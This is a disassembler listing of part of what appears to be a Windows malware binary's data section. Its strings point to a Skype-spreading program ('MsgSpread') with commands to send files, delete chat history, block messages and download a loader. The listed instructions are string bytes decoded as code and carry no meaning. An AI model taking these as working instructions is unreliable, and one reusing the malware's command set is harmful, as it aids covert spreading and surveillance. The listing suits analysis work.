1003BEB9: 006300                   ADD [EBX], AH
1003BEBC: 6F                       OUTSD 
1003BEBD: 006D00                   ADD [EBP], CH
1003BEC0: 7000                     JO 1003BEC2H
1003BEC2: 61                       POPAD 
1003BEC3: 00740069                 ADD [EAX+EAX+69H], DH
1003BEC7: 006200                   ADD [EDX], AH
1003BECA: 6C                       INSB 
1003BECB: 006500                   ADD [EBP], AH
1003BECE: 3B00                     CMP EAX, [EAX]
1003BED0: 2000                     AND [EAX], AL
1003BED2: 4D                       DEC EBP
1003BED3: 005300                   ADD [EBX], DL
1003BED6: 49                       DEC ECX
1003BED7: 004500                   ADD [EBP], AL
1003BEDA: 2000                     AND [EAX], AL
1003BEDC: 36002E                   ADD SS:[ESI], CH
1003BEDF: 0030                     ADD [EAX], DH
1003BEE1: 003B                     ADD [EBX], BH
1003BEE3: 0020                     ADD [EAX], AH
1003BEE5: 005700                   ADD [EDI], DL
1003BEE8: 69006E006400             IMUL EAX, [EAX], 0064006EH
1003BEEE: 6F                       OUTSD 
1003BEEF: 007700                   ADD [EDI], DH
1003BEF2: 7300                     JNB 1003BEF4H
1003BEF4: 2000                     AND [EAX], AL
1003BEF6: 4E                       DEC ESI
1003BEF7: 00540020                 ADD [EAX+EAX+20H], DL
1003BEFB: 0035002E0031             ADD [31002E00H], DH
1003BF01: 003B                     ADD [EBX], BH
1003BF03: 0020                     ADD [EAX], AH
1003BF05: 005300                   ADD [EBX], DL
1003BF08: 56                       PUSH ESI
1003BF09: 0031                     ADD [ECX], DH
1003BF0B: 003B                     ADD [EBX], BH
1003BF0D: 0020                     ADD [EAX], AH
1003BF0F: 002E                     ADD [ESI], CH
1003BF11: 004E00                   ADD [ESI], CL
1003BF14: 45                       INC EBP
1003BF15: 00540020                 ADD [EAX+EAX+20H], DL
1003BF19: 004300                   ADD [EBX], AL
1003BF1C: 4C                       DEC ESP
1003BF1D: 005200                   ADD [EDX], DL
1003BF20: 2000                     AND [EAX], AL
1003BF22: 3100                     XOR [EAX], EAX
1003BF24: 2E0030                   ADD CS:[EAX], DH
1003BF27: 002E                     ADD [ESI], CH
1003BF29: 0033                     ADD [EBX], DH
1003BF2B: 0037                     ADD [EDI], DH
1003BF2D: 0030                     ADD [EAX], DH
1003BF2F: 003500290000             ADD [00002900H], DH
1003BF35: 0000                     ADD [EAX], AL
1003BF37: 006700                   ADD [EDI], AH
1003BF3A: 650074004F               ADD GS:[EAX+EAX+4FH], DH
1003BF3F: 007000                   ADD [EAX], DH
1003BF42: 7400                     JZ 1003BF44H
1003BF44: 69006F006E00             IMUL EAX, [EAX], 006E006FH
1003BF4A: 0000                     ADD [EAX], AL
1003BF4C: 65006E00                 ADD GS:[ESI], CH
1003BF50: 61                       POPAD 
1003BF51: 006200                   ADD [EDX], AH
1003BF54: 6C                       INSB 
1003BF55: 006500                   ADD [EBP], AH
1003BF58: 0000                     ADD [EAX], AL
1003BF5A: 0000                     ADD [EAX], AL
1003BF5C: 7300                     JNB 1003BF5EH
1003BF5E: 65006E00                 ADD GS:[ESI], CH
1003BF62: 64004600                 ADD FS:[ESI], AL
1003BF66: 69006C006500             IMUL EAX, [EAX], 0065006CH
1003BF6C: 0000                     ADD [EAX], AL
1003BF6E: 0000                     ADD [EAX], AL
1003BF70: 7700                     JNBE 1003BF72H
1003BF72: 61                       POPAD 
1003BF73: 006900                   ADD [ECX], CH
1003BF76: 7400                     JZ 1003BF78H
1003BF78: 41                       INC ECX
1003BF79: 007700                   ADD [EDI], DH
1003BF7C: 61                       POPAD 
1003BF7D: 007900                   ADD [ECX], BH
1003BF80: 0000                     ADD [EAX], AL
1003BF82: 0000                     ADD [EAX], AL
1003BF84: 64006500                 ADD FS:[EBP], AH
1003BF88: 6C                       INSB 
1003BF89: 006500                   ADD [EBP], AH
1003BF8C: 7400                     JZ 1003BF8EH
1003BF8E: 65004800                 ADD GS:[EAX], CL
1003BF92: 690073007400             IMUL EAX, [EAX], 00740073H
1003BF98: 6F                       OUTSD 
1003BF99: 007200                   ADD [EDX], DH
1003BF9C: 7900                     JNS 1003BF9EH
1003BF9E: 0000                     ADD [EAX], AL
1003BFA0: 7300                     JNB 1003BFA2H
1003BFA2: 6F                       OUTSD 
1003BFA3: 007500                   ADD [EBP], DH
1003BFA6: 6E                       OUTSB 
1003BFA7: 0064004F                 ADD [EAX+EAX+4FH], AH
1003BFAB: 006600                   ADD [ESI], AH
1003BFAE: 660000                   ADD [EAX], AL
1003BFB1: 0000                     ADD [EAX], AL
1003BFB3: 006600                   ADD [ESI], AH
1003BFB6: 7200                     JB 1003BFB8H
1003BFB8: 65007100                 ADD GS:[ECX], DH
1003BFBC: 7500                     JNZ 1003BFBEH
1003BFBE: 65006E00                 ADD GS:[ESI], CH
1003BFC2: 6300                     ARPL EAX, [EAX]
1003BFC4: 7900                     JNS 1003BFC6H
1003BFC6: 57                       PUSH EDI
1003BFC7: 006F00                   ADD [EDI], CH
1003BFCA: 7200                     JB 1003BFCCH
1003BFCC: 6B0000                   IMUL EAX, [EAX], 00H
1003BFCF: 006200                   ADD [EDX], AH
1003BFD2: 6C                       INSB 
1003BFD3: 006F00                   ADD [EDI], CH
1003BFD6: 6300                     ARPL EAX, [EAX]
1003BFD8: 6B0049                   IMUL EAX, [EAX], 49H
1003BFDB: 006E00                   ADD [ESI], CH
1003BFDE: 4D                       DEC EBP
1003BFDF: 006500                   ADD [EBP], AH
1003BFE2: 7300                     JNB 1003BFE4H
1003BFE4: 7300                     JNB 1003BFE6H
1003BFE6: 61                       POPAD 
1003BFE7: 006700                   ADD [EDI], AH
1003BFEA: 65007300                 ADD GS:[EBX], DH
1003BFEE: 0000                     ADD [EAX], AL
1003BFF0: 6200                     BOUND EAX, [EAX]
1003BFF2: 6C                       INSB 
1003BFF3: 006F00                   ADD [EDI], CH
1003BFF6: 6300                     ARPL EAX, [EAX]
1003BFF8: 6B004F                   IMUL EAX, [EAX], 4FH
1003BFFB: 007500                   ADD [EBP], DH
1003BFFE: 7400                     JZ 1003C000H
1003C000: 4D                       DEC EBP
1003C001: 006500                   ADD [EBP], AH
1003C004: 7300                     JNB 1003C006H
1003C006: 7300                     JNB 1003C008H
1003C008: 61                       POPAD 
1003C009: 006700                   ADD [EDI], AH
1003C00C: 65007300                 ADD GS:[EBX], DH
1003C010: 0000                     ADD [EAX], AL
1003C012: 0000                     ADD [EAX], AL
1003C014: 66006900                 ADD [ECX], CH
1003C018: 6C                       INSB 
1003C019: 006500                   ADD [EBP], AH
1003C01C: 4E                       DEC ESI
1003C01D: 006100                   ADD [ECX], AH
1003C020: 6D                       INSD 
1003C021: 006500                   ADD [EBP], AH
1003C024: 0000                     ADD [EAX], AL
1003C026: 0000                     ADD [EAX], AL
1003C028: 2500730025               AND EAX, 25007300H
1003C02D: 0030                     ADD [EAX], DH
1003C02F: 0032                     ADD [EDX], DH
1003C031: 005800                   ADD [EAX], BL
1003C034: 0000                     ADD [EAX], AL
1003C036: 0000                     ADD [EAX], AL
1003C038: 7500                     JNZ 1003C03AH
1003C03A: 7300                     JNB 1003C03CH
1003C03C: 65007200                 ADD GS:[EDX], DH
1003C040: 3D00250073               CMP EAX, 73002500H
1003C045: 007C0025                 ADD [EAX+EAX+25H], BH
1003C049: 007300                   ADD [EBX], DH
1003C04C: 7C00                     JL 1003C04EH
1003C04E: 2500730026               AND EAX, 26007300H
1003C053: 006600                   ADD [ESI], AH
1003C056: 6E                       OUTSB 
1003C057: 006100                   ADD [ECX], AH
1003C05A: 6D                       INSD 
1003C05B: 006500                   ADD [EBP], AH
1003C05E: 7300                     JNB 1003C060H
1003C060: 3D0000007C               CMP EAX, 7C000000H
1003C065: 0000                     ADD [EAX], AL
1003C067: 0026                     ADD [ESI], AH
1003C069: 006600                   ADD [ESI], AH
1003C06C: 690064007300             IMUL EAX, [EAX], 00730064H
1003C072: 3D00000000               CMP EAX, 00000000H
1003C077: 0026                     ADD [ESI], AH
1003C079: 006600                   ADD [ESI], AH
1003C07C: 61                       POPAD 
1003C07D: 007500                   ADD [EBP], DH
1003C080: 7400                     JZ 1003C082H
1003C082: 68003D0000               PUSH 00003D00H
1003C087: 006100                   ADD [ECX], AH
1003C08A: 6400640055               ADD FS:[EAX+EAX+55H], AH
1003C08F: 007300                   ADD [EBX], DH
1003C092: 65007200                 ADD GS:[EDX], DH
1003C096: 0000                     ADD [EAX], AL
1003C098: 7C00                     JL 1003C09AH
1003C09A: 7C00                     JL 1003C09CH
1003C09C: 7C00                     JL 1003C09EH
1003C09E: 0000                     ADD [EAX], AL
1003C0A0: 7300                     JNB 1003C0A2H
1003C0A2: 65007300                 ADD GS:[EBX], DH
1003C0A6: 7300                     JNB 1003C0A8H
1003C0A8: 69006F006E00             IMUL EAX, [EAX], 006E006FH
1003C0AE: 3D00250073               CMP EAX, 73002500H
1003C0B3: 0026                     ADD [ESI], AH
1003C0B5: 007500                   ADD [EBP], DH
1003C0B8: 7300                     JNB 1003C0BAH
1003C0BA: 65007200                 ADD GS:[EDX], DH
1003C0BE: 3D00250073               CMP EAX, 73002500H
1003C0C3: 0026                     ADD [ESI], AH
1003C0C5: 006600                   ADD [ESI], AH
1003C0C8: 690064007300             IMUL EAX, [EAX], 00730064H
1003C0CE: 3D00000000               CMP EAX, 00000000H
1003C0D3: 006100                   ADD [ECX], AH
1003C0D6: 6C                       INSB 
1003C0D7: 006C0044                 ADD [EAX+EAX+44H], CH
1003C0DB: 006F00                   ADD [EDI], CH
1003C0DE: 6E                       OUTSB 
1003C0DF: 006500                   ADD [EBP], AH
1003C0E2: 0000                     ADD [EAX], AL
1003C0E4: 6D                       INSD 
1003C0E5: 7370                     JNB 1003C157H
1003C0E7: 7265                     JB 1003C14EH
1003C0E9: 61                       POPAD 
1003C0EA: 646D                     INSD 
1003C0EC: 7574                     JNZ 1003C162H
1003C0EE: 657800                   JS 1003C0F1H
1003C0F1: 0000                     ADD [EAX], AL
1003C0F3: 00536B                   ADD [EBX+6BH], DL
1003C0F6: 7970                     JNS 1003C168H
1003C0F8: 6550                     PUSH EAX
1003C0FA: 61                       POPAD 
1003C0FB: 7468                     JZ 1003C165H
1003C0FD: 0000                     ADD [EAX], AL
1003C0FF: 00536F                   ADD [EBX+6FH], DL
1003C102: 667477                   JZ C17CH
1003C105: 61                       POPAD 
1003C106: 7265                     JB 1003C16DH
1003C108: 5C                       POP ESP
1003C109: 53                       PUSH EBX
1003C10A: 6B797065                 IMUL EDI, [ECX+70H], 65H
1003C10E: 5C                       POP ESP
1003C10F: 50                       PUSH EAX
1003C110: 686F6E6500               PUSH 00656E6FH
1003C115: 0000                     ADD [EAX], AL
1003C117: 004D73                   ADD [EBP+73H], CL
1003C11A: 6753                     PUSH EBX
1003C11C: 7072                     JO 1003C190H
1003C11E: 6561                     POPAD 
1003C120: 643A20                   CMP AH, FS:[EAX]
1003C123: 4E                       DEC ESI
1003C124: 6F                       OUTSD 
1003C125: 20536B                   AND [EBX+6BH], DL
1003C128: 7970                     JNS 1003C19AH
1003C12A: 6520696E                 AND GS:[ECX+6EH], CH
1003C12E: 7374                     JNB 1003C1A4H
1003C130: 61                       POPAD 
1003C131: 6C                       INSB 
1003C132: 6C                       INSB 
1003C133: 65642E204578             AND CS:[EBP+78H], AL
1003C139: 6974696E672E2E2E         IMUL ESI, [ECX+EBP*2+6EH], 2E2E2E67H
1003C141: 0000                     ADD [EAX], AL
1003C143: 004D73                   ADD [EBP+73H], CL
1003C146: 6753                     PUSH EBX
1003C148: 7072                     JO 1003C1BCH
1003C14A: 6561                     POPAD 
1003C14C: 643A20                   CMP AH, FS:[EAX]
1003C14F: 6E                       OUTSB 
1003C150: 6F                       OUTSD 
1003C151: 20536B                   AND [EBX+6BH], DL
1003C154: 7970                     JNS 1003C1C6H
1003C156: 652D73657276             SUB EAX, 76726573H
1003C15C: 657220                   JB 1003C17FH
1003C15F: 7365                     JNB 1003C1C6H
1003C161: 742E                     JZ 1003C191H
1003C163: 004D73                   ADD [EBP+73H], CL
1003C166: 6753                     PUSH EBX
1003C168: 7072                     JO 1003C1DCH
1003C16A: 6561                     POPAD 
1003C16C: 643A20                   CMP AH, FS:[EAX]
1003C16F: 53                       PUSH EBX
1003C170: 6B797065                 IMUL EDI, [ECX+70H], 65H
1003C174: 2D73657276               SUB EAX, 76726573H
1003C179: 657220                   JB 1003C19CH
1003C17C: 657272                   JB 1003C1F1H
1003C17F: 6F                       OUTSD 
1003C180: 7220                     JB 1003C1A2H
1003C182: 2D206F7074               SUB EAX, 74706F20H
1003C187: 696F6E732E0000           IMUL EBP, [EDI+6EH], 00002E73H
1003C18E: 0000                     ADD [EAX], AL
1003C190: 4D                       DEC EBP
1003C191: 7367                     JNB 1003C1FAH
1003C193: 53                       PUSH EBX
1003C194: 7072                     JO 1003C208H
1003C196: 6561                     POPAD 
1003C198: 643A20                   CMP AH, FS:[EAX]
1003C19B: 43                       INC EBX
1003C19C: 61                       POPAD 
1003C19D: 6E                       OUTSB 
1003C19E: 6E                       OUTSB 
1003C19F: 6F                       OUTSD 
1003C1A0: 7420                     JZ 1003C1C2H
1003C1A2: 646F                     OUTSD 
1003C1A4: 776E                     JNBE 1003C214H
1003C1A6: 6C                       INSB 
1003C1A7: 6F                       OUTSD 
1003C1A8: 61                       POPAD 
1003C1A9: 64206C6F61               AND FS:[EDI+EBP*2+61H], CH
1003C1AE: 6465722E                 JB 1003C1E0H
1003C1B2: 0000                     ADD [EAX], AL
1003C1B4: 4D                       DEC EBP
1003C1B5: 7367                     JNB 1003C21EH
1003C1B7: 53                       PUSH EBX
1003C1B8: 7072                     JO 1003C22CH
1003C1BA: 6561                     POPAD 
1003C1BC: 643A20                   CMP AH, FS:[EAX]
1003C1BF: 53                       PUSH EBX
1003C1C0: 6F                       OUTSD 
1003C1C1: 756E                     JNZ 1003C231H
1003C1C3: 64204641                 AND FS:[ESI+41H], AL
1003C1C7: 49                       DEC ECX
1003C1C8: 4C                       DEC ESP
1003C1C9: 2E0000                   ADD CS:[EAX], AL
1003C1CC: 4D                       DEC EBP
1003C1CD: 7367                     JNB 1003C236H
1003C1CF: 53                       PUSH EBX
1003C1D0: 7072                     JO 1003C244H
1003C1D2: 6561                     POPAD 
1003C1D4: 643A20                   CMP AH, FS:[EAX]
1003C1D7: 46                       INC ESI
1003C1D8: 756C                     JNZ 1003C246H
1003C1DA: 6C                       INSB 
1003C1DB: 206869                   AND [EAX+69H], CH
1003C1DE: 7374                     JNB 1003C254H
1003C1E0: 6F                       OUTSD 
1003C1E1: 7279                     JB 1003C25CH
1003C1E3: 204641                   AND [ESI+41H], AL
1003C1E6: 49                       DEC ECX
1003C1E7: 4C                       DEC ESP
1003C1E8: 2E0000                   ADD CS:[EAX], AL
1003C1EB: 004D73                   ADD [EBP+73H], CL
1003C1EE: 6753                     PUSH EBX
1003C1F0: 7072                     JO 1003C264H
1003C1F2: 6561                     POPAD 
1003C1F4: 643A20                   CMP AH, FS:[EAX]
1003C1F7: 44                       INC ESP
1003C1F8: 42                       INC EDX
1003C1F9: 206869                   AND [EAX+69H], CH
1003C1FC: 7374                     JNB 1003C272H
1003C1FE: 6F                       OUTSD 
1003C1FF: 7279                     JB 1003C27AH
1003C201: 204641                   AND [ESI+41H], AL
1003C204: 49                       DEC ECX
1003C205: 4C                       DEC ESP
1003C206: 2E00FE                   ADD DH, BH
1003C209: 8B87B1D3532E             MOV EAX, [EDI+2E53D3B1H]
1003C20F: 40                       INC EAX
1003C210: 8C86190B19AF             MOV [ESI-50E6F4E7H], ES
1003C216: 70D5                     JO 1003C1EDH
1003C218: FC                       CLD 
1003C219: 90                       NOP 
1003C21A: 06                       PUSH ES
1003C21B: 832FBF                   SUB [EDI], FFFFFFBFH
1003C21E: A6                       CMPSB 
1003C21F: 47                       INC EDI
1003C220: AC                       LODSB 
1003C221: 2D330BCB40               SUB EAX, 40CB0B33H
1003C226: 266466696C65206973       IMUL BP, FS:[EBP+*2]
1003C22F: 20656E                   AND [EBP+6EH], AH
1003C232: 637279                   ARPL ESI, [EDX+79H]
1003C235: 7074                     JO 1003C2ABH
1003C237: 6564206F72               AND FS:[EDI+72H], CH
1003C23C: 206973                   AND [ECX+73H], CH
1003C23F: 206E6F                   AND [ESI+6FH], CH
1003C242: 7420                     JZ 1003C264H
1003C244: 61                       POPAD 
1003C245: 20646174                 AND AH, [ECX+*2]
1003C249: 61                       POPAD 
1003C24A: 626173                   BOUND ESP, [ECX+73H]
1003C24D: 650000                   ADD GS:[EAX], AL
1003C250: 62696E                   BOUND EBP, [ECX+6EH]
1003C253: 64206F72                 AND FS:[EDI+72H], CH
1003C257: 20636F                   AND [EBX+6FH], AH
1003C25A: 6C                       INSB 
1003C25B: 756D                     JNZ 1003C2CAH
1003C25D: 6E                       OUTSB 
1003C25E: 20696E                   AND [ECX+6EH], CH
1003C261: 64657820                 JS 1003C285H
1003C265: 6F                       OUTSD 
1003C266: 7574                     JNZ 1003C2DCH
1003C268: 206F66                   AND [EDI+66H], CH
1003C26B: 207261                   AND [EDX+61H], DH
1003C26E: 6E                       OUTSB 
1003C26F: 67650000                 ADD GS:[BX+SI], AL
1003C273: 006175                   ADD [ECX+75H], AH
1003C276: 7869                     JS 1003C2E1H
1003C278: 6C                       INSB 
1003C279: 69617279206461           IMUL ESP, [ECX+72H], 61642079H
1003C280: 7461                     JZ 1003C2E3H
1003C282: 626173                   BOUND ESP, [ECX+73H]
1003C285: 6520666F                 AND GS:[ESI+6FH], AH
1003C289: 726D                     JB 1003C2F8H
1003C28B: 61                       POPAD 
1003C28C: 7420                     JZ 1003C2AEH
1003C28E: 657272                   JB 1003C303H
1003C291: 6F                       OUTSD 
1003C292: 7200                     JB 1003C294H
1003C294: 61                       POPAD 
1003C295: 7574                     JNZ 1003C30BH
1003C297: 686F72697A               PUSH 7A69726FH
1003C29C: 61                       POPAD 
1003C29D: 7469                     JZ 1003C308H
1003C29F: 6F                       OUTSD 
1003C2A0: 6E                       OUTSB 
1003C2A1: 2064656E                 AND AH, [EBP+*2]
1003C2A5: 69656400000000           IMUL ESP, [EBP+64H], 00000000H
1003C2AC: 6C                       INSB 
1003C2AD: 61                       POPAD 
1003C2AE: 7267                     JB 1003C317H
1003C2B0: 65206669                 AND GS:[ESI+69H], AH
1003C2B4: 6C                       INSB 
1003C2B5: 65207375                 AND GS:[EBX+75H], DH
1003C2B9: 7070                     JO 1003C32BH
1003C2BB: 6F                       OUTSD 
1003C2BC: 7274                     JB 1003C332H
1003C2BE: 206973                   AND [ECX+73H], CH
1003C2C1: 20646973                 AND [ECX+EBP*2+73H], AH
1003C2C5: 61                       POPAD 
1003C2C6: 626C6564                 BOUND EBP, [EBP+*2]
1003C2CA: 0000                     ADD [EAX], AL
1003C2CC: 6C                       INSB 
1003C2CD: 69627261727920           IMUL ESP, [EDX+72H], 20797261H
1003C2D4: 726F                     JB 1003C345H
1003C2D6: 7574                     JNZ 1003C34CH
1003C2D8: 696E652063616C           IMUL EBP, [ESI+65H], 6C616320H
1003C2DF: 6C                       INSB 
1003C2E0: 6564206F75               AND FS:[EDI+75H], CH
1003C2E5: 7420                     JZ 1003C307H
1003C2E7: 6F                       OUTSD 
1003C2E8: 66207365                 AND [EBX+65H], DH
1003C2EC: 7175                     JNO 1003C363H
1003C2EE: 656E                     OUTSB 
1003C2F0: 636500                   ARPL ESP, [EBP]
1003C2F3: 00646174                 ADD AH, [ECX+*2]
1003C2F7: 61                       POPAD 
1003C2F8: 7479                     JZ 1003C373H
1003C2FA: 7065                     JO 1003C361H
1003C2FC: 206D69                   AND [EBP+69H], CH
1003C2FF: 736D                     JNB 1003C36EH
1003C301: 61                       POPAD 
1003C302: 7463                     JZ 1003C367H
1003C304: 6800000063               PUSH 63000000H
1003C309: 6F                       OUTSD 
1003C30A: 6E                       OUTSB 
1003C30B: 7374                     JNB 1003C381H
1003C30D: 7261                     JB 1003C370H
1003C30F: 696E7420666169           IMUL EBP, [ESI+74H], 69616620H
1003C316: 6C                       INSB 
1003C317: 65640000                 ADD FS:[EAX], AL
1003C31B: 00746162                 ADD DH, [ECX+*2]